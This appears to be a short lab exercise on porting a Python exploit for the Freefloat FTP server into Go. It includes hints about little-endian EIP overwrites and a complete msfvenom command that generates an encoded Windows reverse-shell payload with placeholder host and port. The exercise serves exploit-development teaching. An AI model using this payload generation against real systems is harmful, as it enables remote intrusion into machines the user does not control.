# Exercise 5 - Porting an exploit

Port an existing exploit (written in python) for the Freefloat FTP server. The initial code is located here: https://gist.github.com/dgiampouris/daac071709ea9b83aadfe69b45ed9827 

Hints: 

- The x86 architecture has little-endian byte ordering. This affects how memory addresses are stored in EIP. 

- Use msfvenom to generate a payload (e.g. msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -b "\x00\x0d\x0a" EXITFUNC=thread -f csharp ) 

- The above command should be sufficient 

- The csharp format is used because it is convenient for go as well. 

- Try to follow the logic of the python exploit as closely as possible. 
